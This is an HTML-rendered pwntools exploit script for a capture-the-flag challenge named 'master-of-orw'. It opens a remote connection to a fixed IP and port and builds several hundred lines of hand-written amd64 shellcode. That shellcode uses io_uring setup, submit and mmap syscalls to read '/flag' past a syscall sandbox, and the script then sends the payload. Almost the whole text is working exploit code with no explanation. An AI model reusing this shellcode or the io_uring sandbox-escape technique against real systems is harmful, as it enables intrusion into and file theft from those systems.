<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> sys.warnoptions:</span><br><span class="line">    <span class="keyword">import</span> warnings</span><br><span class="line">    warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.os = &quot;linux&quot;</span></span><br><span class="line"><span class="comment"># r = process([&quot;gdb&quot;, &quot;./exp&quot;])</span></span><br><span class="line"><span class="comment"># r.send(&quot;set disassembly-flavor intel\nb main\nstart\n&quot; + &quot;x/i $rip\nsi\n&quot; * 0x300)</span></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with open(&quot;exp.asm&quot;, &quot;r&quot;) as f:</span></span><br><span class="line"><span class="comment">#     all_text = f.read()</span></span><br><span class="line"><span class="comment">#     lines = all_text.split(&quot;(gdb)&quot;)</span></span><br><span class="line"><span class="comment">#     for line in lines:</span></span><br><span class="line"><span class="comment">#         if(&quot;=&gt;&quot;) in line:</span></span><br><span class="line"><span class="comment">#             asm_code = line[line.index(&quot;&gt;:&quot;) + 2:].strip()</span></span><br><span class="line"><span class="comment">#             if(asm_code[:4] == &quot;call&quot;):</span></span><br><span class="line"><span class="comment">#                 print(asm_code)</span></span><br><span class="line"><span class="comment">#             if(&quot;endbr64&quot; in asm_code):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             print(asm_code)</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&quot;\xce\xb8&quot;.decode()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./master-of-orw&quot;, env = &#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &quot;b * $rebase(0x15BD)\nc&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;120.46.65.156&quot;</span>, <span class="string">&quot;32101&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">lea    rax,[rip+0x3f9-7]</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">push   0x1</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">movq   xmm2,rax</span></span><br><span class="line"><span class="string">sub    rsp,0x108</span></span><br><span class="line"><span class="string">lea    rbx,[rsp+0x20]</span></span><br><span class="line"><span class="string">lea    rbp,[rsp+0x40]</span></span><br><span class="line"><span class="string">movq   xmm0,rbx</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">lea    r12,[rsp+0x18]</span></span><br><span class="line"><span class="string">punpcklqdq xmm0,xmm2</span></span><br><span class="line"><span class="string">movaps XMMWORD PTR [rsp],xmm0</span></span><br><span class="line"><span class="string">sub    rsp,0x88</span></span><br><span class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">pop    r9</span></span><br><span class="line"><span class="string">push   rdi</span></span><br><span class="line"><span class="string">pop    r8</span></span><br><span class="line"><span class="string">push   0xf</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">xor    eax,eax</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">rep stos QWORD PTR es:[rdi],rax</span></span><br><span class="line"><span class="string">push   r8</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">push   r12</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">push   rbx</span></span><br><span class="line"><span class="string">mov    rbx,rsi</span></span><br><span class="line"><span class="string">mov    rsi,rdx</span></span><br><span class="line"><span class="string">sub    rsp,0x10</span></span><br><span class="line"><span class="string">mov    esi,edi</span></span><br><span class="line"><span class="string">push   0x1a9</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">call   syscall_func</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">lea    rdi,[rbx+0x8]</span></span><br><span class="line"><span class="string">mov    r12d,eax</span></span><br><span class="line"><span class="string">and    rdi,0xfffffffffffffff8</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbx],0x0</span></span><br><span class="line"><span class="string">mov    rdx,rbx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbx+0xd0],0x0</span></span><br><span class="line"><span class="string">mov    ecx, 26</span></span><br><span class="line"><span class="string">rep stos QWORD PTR es:[rdi],rax</span></span><br><span class="line"><span class="string">lea    rcx,[rbx+0x68]</span></span><br><span class="line"><span class="string">mov    edi,r12d</span></span><br><span class="line"><span class="string">mov    r13d,edi</span></span><br><span class="line"><span class="string">push   r12</span></span><br><span class="line"><span class="string">mov    r12,rcx</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">mov    rbp,rdx</span></span><br><span class="line"><span class="string">push   rbx</span></span><br><span class="line"><span class="string">mov    rbx,rsi</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rsi]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rsi+0x40]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [rsi+0x4]</span></span><br><span class="line"><span class="string">lea    rax,[rax+rdx*4]</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x64]</span></span><br><span class="line"><span class="string">shl    rsi,0x4</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x48],rax</span></span><br><span class="line"><span class="string">add    rsi,rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rcx+0x38],rsi</span></span><br><span class="line"><span class="string">mov    rsi,QWORD PTR [rbp+0x48]</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x38],rsi</span></span><br><span class="line"><span class="string">mov    r8d,r13d</span></span><br><span class="line"><span class="string">push   0x8001</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">xor    edi,edi</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x50],rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x40],rax</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x28]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [rbx]</span></span><br><span class="line"><span class="string">mov    r9d,0x10000000</span></span><br><span class="line"><span class="string">mov    r8d,r13d</span></span><br><span class="line"><span class="string">push   0x8001</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">shl    rsi,0x6</span></span><br><span class="line"><span class="string">push   0</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">loop1:</span></span><br><span class="line"><span class="string">    add    rdx,rax</span></span><br><span class="line"><span class="string">    mov    QWORD PTR [rbp+r15*8],rdx</span></span><br><span class="line"><span class="string">    mov    edx,DWORD PTR [rbx+0x2c+r15*4]</span></span><br><span class="line"><span class="string">    inc    r15</span></span><br><span class="line"><span class="string">    cmp    r15, 6</span></span><br><span class="line"><span class="string">    jnz loop1</span></span><br><span class="line"><span class="string">add    rax,rdx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x30],rax</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rbp+0x38],rax</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x50]</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [r12+0x40]</span></span><br><span class="line"><span class="string">push   0</span></span><br><span class="line"><span class="string">pop    r13</span></span><br><span class="line"><span class="string">push   0</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">loop2:</span></span><br><span class="line"><span class="string">    add    rdx,rax</span></span><br><span class="line"><span class="string">    mov    QWORD PTR [r12+r15*8],rdx</span></span><br><span class="line"><span class="string">    mov    edx,DWORD PTR [rbx+0x54+r15*4]</span></span><br><span class="line"><span class="string">    inc    r15</span></span><br><span class="line"><span class="string">    cmp    r15, 4</span></span><br><span class="line"><span class="string">    jnz loop2</span></span><br><span class="line"><span class="string">add    rdx,rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x28],rdx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x64]</span></span><br><span class="line"><span class="string">add    rdx,rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x30],rdx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rbx+0x68]</span></span><br><span class="line"><span class="string">add    rax,rdx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r12+0x20],rax</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">pop    r12</span></span><br><span class="line"><span class="string">mov    r13d,eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rbp+0x8]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc4],r12d</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc0],eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rbp+0x14]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rbx+0xc8],eax</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">pop    r12</span></span><br><span class="line"><span class="string">add    rsp,0x88</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">call   io_uring_get_sqe_func</span></span><br><span class="line"><span class="string">pxor   xmm1,xmm1</span></span><br><span class="line"><span class="string">movdqa xmm0,XMMWORD PTR [rsp]</span></span><br><span class="line"><span class="string">movabs rcx,0xffffffff0000001c</span></span><br><span class="line"><span class="string">movaps XMMWORD PTR [rsp+0x20],xmm1</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rsp+0x30],0x0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax],rcx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x18],0x18</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x20],0x0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x28],0x0</span></span><br><span class="line"><span class="string">movups XMMWORD PTR [rax+0x8],xmm0</span></span><br><span class="line"><span class="string">pxor   xmm0,xmm0</span></span><br><span class="line"><span class="string">movups XMMWORD PTR [rax+0x30],xmm0</span></span><br><span class="line"><span class="string">call   io_uring_submit_func</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    ecx,0x1</span></span><br><span class="line"><span class="string">mov    rsi,r12</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   __io_uring_get_cqe_func</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="string">xor    r9d,r9d</span></span><br><span class="line"><span class="string">xor    edi,edi</span></span><br><span class="line"><span class="string">mov    rdx,QWORD PTR [rsp+0xa8]</span></span><br><span class="line"><span class="string">mov    ecx,0x2</span></span><br><span class="line"><span class="string">mov    esi,0x30</span></span><br><span class="line"><span class="string">mov    r8d,DWORD PTR [rax+0x8]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdx]</span></span><br><span class="line"><span class="string">add    eax,0x1</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdx],eax</span></span><br><span class="line"><span class="string">mov    edx,0x3</span></span><br><span class="line"><span class="string">call   mmap64_func</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rsp+0x28],0x40</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rsp+0x20],rax</span></span><br><span class="line"><span class="string">call   io_uring_get_sqe_func</span></span><br><span class="line"><span class="string">pxor   xmm0,xmm0</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">movabs rsi,0x100000002</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax],rsi</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x8],0x0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x10],rbx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x18],0x1</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x20],0x0</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rax+0x28],0x0</span></span><br><span class="line"><span class="string">movups XMMWORD PTR [rax+0x30],xmm0</span></span><br><span class="line"><span class="string">call   io_uring_submit_func</span></span><br><span class="line"><span class="string">xor    r8d,r8d</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    ecx,0x1</span></span><br><span class="line"><span class="string">mov    rsi,r12</span></span><br><span class="line"><span class="string">mov    rdi,rbp</span></span><br><span class="line"><span class="string">call   __io_uring_get_cqe_func</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_get_sqe_func:</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rdi]</span></span><br><span class="line"><span class="string">xor    r8d,r8d</span></span><br><span class="line"><span class="string">mov    ecx,DWORD PTR [rax]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdi+0x44]</span></span><br><span class="line"><span class="string">lea    edx,[rax+0x1]</span></span><br><span class="line"><span class="string">mov    esi,edx</span></span><br><span class="line"><span class="string">sub    esi,ecx</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rdi+0x18]</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rdi+0x10]</span></span><br><span class="line"><span class="string">and    eax,DWORD PTR [rcx]</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdi+0x44],edx</span></span><br><span class="line"><span class="string">shl    rax,0x6</span></span><br><span class="line"><span class="string">add    rax,QWORD PTR [rdi+0x38]</span></span><br><span class="line"><span class="string">mov    r8,rax</span></span><br><span class="line"><span class="string">mov    rax,r8</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io_uring_submit_func:</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">mov    r10,QWORD PTR [rdi+0x8]</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rdi+0x40]</span></span><br><span class="line"><span class="string">mov    r8d,DWORD PTR [rdi+0x44]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [r10]</span></span><br><span class="line"><span class="string">sub    r8d,edx</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rdi+0x10]</span></span><br><span class="line"><span class="string">mov    r9,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="string">add    r8d,eax</span></span><br><span class="line"><span class="string">mov    ecx,DWORD PTR [rcx]</span></span><br><span class="line"><span class="string">nop    DWORD PTR [rax+0x0]</span></span><br><span class="line"><span class="string">mov    esi,eax</span></span><br><span class="line"><span class="string">and    edx,ecx</span></span><br><span class="line"><span class="string">add    eax,0x1</span></span><br><span class="line"><span class="string">and    esi,ecx</span></span><br><span class="line"><span class="string">mov    DWORD PTR [r9+rsi*4],edx</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rdi+0x40]</span></span><br><span class="line"><span class="string">add    edx,0x1</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rdi+0x40],edx</span></span><br><span class="line"><span class="string">mov    DWORD PTR [r10],eax</span></span><br><span class="line"><span class="string">mov    rdx,QWORD PTR [rdi]</span></span><br><span class="line"><span class="string">sub    eax,DWORD PTR [rdx]</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    esi,eax</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rdi+0xc0]</span></span><br><span class="line"><span class="string">mov    ecx,eax</span></span><br><span class="line"><span class="string">and    ecx,0x2</span></span><br><span class="line"><span class="string">mov    r8d,ecx</span></span><br><span class="line"><span class="string">or     r8d,0x1</span></span><br><span class="line"><span class="string">test   al,0x1</span></span><br><span class="line"><span class="string">cmovne ecx,r8d</span></span><br><span class="line"><span class="string">mov    edi,DWORD PTR [rdi+0xc4]</span></span><br><span class="line"><span class="string">mov    r9,r8</span></span><br><span class="line"><span class="string">mov    r8d,ecx</span></span><br><span class="line"><span class="string">mov    ecx,edx</span></span><br><span class="line"><span class="string">mov    edx,esi</span></span><br><span class="line"><span class="string">mov    esi,edi</span></span><br><span class="line"><span class="string">mov    edi,0x1aa</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">push   0x8</span></span><br><span class="line"><span class="string">call   syscall_func</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">pop    r15</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall_func:</span></span><br><span class="line"><span class="string">mov    rax,rdi</span></span><br><span class="line"><span class="string">mov    rdi,rsi</span></span><br><span class="line"><span class="string">mov    rsi,rdx</span></span><br><span class="line"><span class="string">mov    rdx,rcx</span></span><br><span class="line"><span class="string">mov    r10,r8</span></span><br><span class="line"><span class="string">mov    r8,r9</span></span><br><span class="line"><span class="string">mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__io_uring_get_cqe_func:</span></span><br><span class="line"><span class="string">sub    rsp,0x28</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rsp],edx</span></span><br><span class="line"><span class="string">mov    rdx,rsp</span></span><br><span class="line"><span class="string">movabs rax,0x800000000</span></span><br><span class="line"><span class="string">mov    DWORD PTR [rsp+0x4],ecx</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rsp+0x8],rax</span></span><br><span class="line"><span class="string">mov    QWORD PTR [rsp+0x10],r8</span></span><br><span class="line"><span class="string">push   r13</span></span><br><span class="line"><span class="string">mov    r13,rsi</span></span><br><span class="line"><span class="string">push   r12</span></span><br><span class="line"><span class="string">mov    r12,rdx</span></span><br><span class="line"><span class="string">push   rbp</span></span><br><span class="line"><span class="string">mov    rbp,rdi</span></span><br><span class="line"><span class="string">push   rbx</span></span><br><span class="line"><span class="string">push   r15</span></span><br><span class="line"><span class="string">nop    DWORD PTR [rax+rax*1+0x0]</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rbp+0x78]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [rax]</span></span><br><span class="line"><span class="string">mov    rax,QWORD PTR [rbp+0x70]</span></span><br><span class="line"><span class="string">mov    edx,DWORD PTR [rax]</span></span><br><span class="line"><span class="string">mov    rcx,QWORD PTR [rbp+0x68]</span></span><br><span class="line"><span class="string">mov    eax,DWORD PTR [rcx]</span></span><br><span class="line"><span class="string">sub    edx,eax</span></span><br><span class="line"><span class="string">mov    ebx,esi</span></span><br><span class="line"><span class="string">and    ebx,eax</span></span><br><span class="line"><span class="string">shl    rbx,0x4</span></span><br><span class="line"><span class="string">add    rbx,QWORD PTR [rbp+0x98]</span></span><br><span class="line"><span class="string">mov    esi,DWORD PTR [r12]</span></span><br><span class="line"><span class="string">xor    r8d,r8d</span></span><br><span class="line"><span class="string">mov    QWORD PTR [r13+0x0],rbx</span></span><br><span class="line"><span class="string">add    rsp,0x8</span></span><br><span class="line"><span class="string">mov    eax,r8d</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">pop    rbp</span></span><br><span class="line"><span class="string">pop    r12</span></span><br><span class="line"><span class="string">pop    r13</span></span><br><span class="line"><span class="string">add    rsp,0x28</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mmap64_func:</span></span><br><span class="line"><span class="string">mov    r10d,ecx</span></span><br><span class="line"><span class="string">push   0x9</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode += asm(payload, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;Input your code\n&quot;</span>, shellcode + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x3f9</span> - <span class="built_in">len</span>(shellcode)) + <span class="string">b&quot;/flag\x00&quot;</span>)</span><br><span 